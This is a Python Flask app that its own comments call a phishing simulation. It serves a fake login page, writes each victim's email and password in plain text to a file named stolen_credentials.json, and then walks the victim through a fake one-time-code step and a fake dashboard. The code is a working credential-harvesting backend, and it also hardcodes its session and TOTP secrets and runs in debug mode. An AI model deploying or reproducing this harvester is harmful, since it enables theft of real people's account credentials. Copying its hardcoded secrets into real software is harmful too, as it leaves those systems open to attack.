from flask import Flask, render_template, request, session, redirect, url_for
import pyotp
import json
import os

# Initialize Flask app and set secret key for sessions
app = Flask(__name__)
app.secret_key = "super_secret_key"

# Fixed secret key for TOTP (for demo/testing only)
MFA_SECRET = "JBSWY3DPEHPK3PXP"
totp = pyotp.TOTP(MFA_SECRET)

# File to store stolen credentials
CREDENTIALS_FILE = "stolen_credentials.json"

# Function to save email-password credentials
def save_credentials(email, password):
    credentials = {}
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, "r") as file:
            credentials = json.load(file)
    credentials[email] = password
    with open(CREDENTIALS_FILE, "w") as file:
        json.dump(credentials, file, indent=4)

# Route for fake login page (phishing simulation)
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]

        if not email or not password:
            return render_template("fake_login.html", error="Both fields are required.")

        save_credentials(email, password)
        session["email"] = email

        print(f"[DEBUG] OTP for {email}: {totp.now()}")

        return redirect(url_for("otp"))

    return render_template("fake_login.html")

# Route for MFA OTP verification
@app.route("/otp", methods=["GET", "POST"])
def otp():
    if "email" not in session:
        return redirect(url_for("login"))

    print(f"[DEBUG] Current OTP for {session['email']}: {totp.now()}")

    if request.method == "POST":
        user_otp = request.form["otp"]
        if totp.verify(user_otp, valid_window=1):
            return redirect(url_for("dashboard"))
        else:
            return render_template("otp.html", error="Invalid OTP. Try again.")

    return render_template("otp.html")

# Route for fake dashboard page
@app.route("/dashboard")
def dashboard():
    if "email" not in session:
        return redirect(url_for("login"))
    return render_template("dashboard.html", email=session["email"])

# Route to simulate logout
@app.route("/logout")
def logout():
    session.clear()
    return render_template("logout.html")

if __name__ == "__main__":
    app.run(debug=True)
